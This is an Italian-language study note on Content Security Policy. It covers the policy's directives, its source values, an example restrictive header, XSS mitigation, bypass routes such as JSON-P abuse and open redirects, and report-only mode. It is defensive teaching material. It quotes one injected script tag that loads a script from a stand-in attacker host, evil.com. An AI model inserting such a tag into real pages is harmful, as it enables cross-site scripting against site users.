# Content Security Policy (CSP)

**Tag:** #security #web-security #mitigation #CSP #XSS #hardening

**Fonte:** [[5 - CS Application Level - Web Security Part II]]

---

## 📝 Definizione

La **Content Security Policy (CSP)** è un meccanismo di sicurezza "Defense-in-Depth" implementato tramite un header HTTP (`Content-Security-Policy`).

Permette agli amministratori di un sito web di dichiarare esplicitamente quali sorgenti di contenuto dinamico sono autorizzate a essere caricate ed eseguite dal browser.

- **Obiettivo principale:** Mitigare e rilevare determinati tipi di attacchi, in particolare il **Cross-Site Scripting ([[XSS]])** e le iniezioni di dati.
    
- **Principio:** Funziona secondo una logica di _whitelisting_ (tutto ciò che non è esplicitamente permesso è bloccato).
    

---

## ⚙️ Funzionamento e Direttive

Il server invia l'header CSP con una serie di direttive. Il browser analizza queste regole e blocca qualsiasi risorsa che violi la policy.

### Direttive Comuni

- `default-src`: La regola di fallback per i tipi di contenuto non specificati in altre direttive.
    
- `script-src`: Controlla da dove possono essere caricati ed eseguiti gli script (cruciale per XSS).
    
- `style-src`: Definisce le sorgenti per i fogli di stile (CSS).
    
- `img-src`: Definisce le sorgenti per le immagini.
    
- `connect-src`: Limita i domini verso cui possono essere inviati dati (es. tramite `fetch`, `XHR`).
    
- `frame-ancestors`: Specifica chi può incorporare la pagina corrente in un frame (mitigazione per il **Clickjacking**).
    

### Valori Speciali (Source List)

- `'self'`: Consente risorse provenienti dalla stessa origine (schema, host e porta) della pagina.
    
- `'none'`: Blocca tutto per quella direttiva.
    
- `'unsafe-inline'`: Consente l'uso di script o stili inline (es. `<script>...</script>` o `style="..."`). **Sconsigliato** perché riapre la porta all'XSS.
    
- `'unsafe-eval'`: Consente l'uso di funzioni di valutazione del codice come `eval()`. **Sconsigliato**.
    
- **Nonce (Number used once):** Una stringa casuale crittografica (es. `nonce-r4nd0m`) che permette di autorizzare specifici script inline senza abilitare `'unsafe-inline'`.
    
- **Hash:** Permette l'esecuzione di uno script specifico se il suo hash (es. SHA-256) corrisponde a quello nella policy.
    

---

## 🛡️ Esempi di Utilizzo

### Policy Restrittiva (Best Practice)

HTTP

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-scripts.com; object-src 'none';
```

- Tutto deve provenire dallo stesso dominio (`'self'`).
    
- Gli script possono venire anche da `trusted-scripts.com`.
    
- Plugin (Flash, Java) sono disabilitati (`object-src 'none'`).
    

### Mitigazione XSS

Se un attaccante riesce a iniettare uno script:

`<script src="http://evil.com/xss.js"></script>`

Con una CSP attiva che non include `evil.com`, il browser **rifiuterà** di caricare lo script, neutralizzando l'attacco anche se la vulnerabilità di iniezione esiste.

---

## ⚠️ Limitazioni e Bypass

1. **JSON-P Abuse:** Se la CSP mette in whitelist un dominio che espone endpoint JSON-P, un attaccante può usare quel dominio per aggirare la policy ed eseguire script (vedi nota [[JSON-P (JSON with Padding)]]).
    
2. **Open Redirect:** Se un dominio fidato ha un open redirect, potrebbe essere usato per caricare risorse da origini non fidate.
    
3. **Policy Deboli:** L'uso di `'unsafe-inline'` o `'unsafe-eval'` vanifica gran parte della protezione contro XSS.
    

---

## 📊 Report-Only Mode

È possibile implementare la CSP in modalità di solo report per testare le regole senza rompere il sito.

- **Header:** `Content-Security-Policy-Report-Only`
    
- **Comportamento:** Le violazioni non vengono bloccate, ma vengono inviate (in formato JSON) a un URI specificato nella direttiva `report-uri` o `report-to`.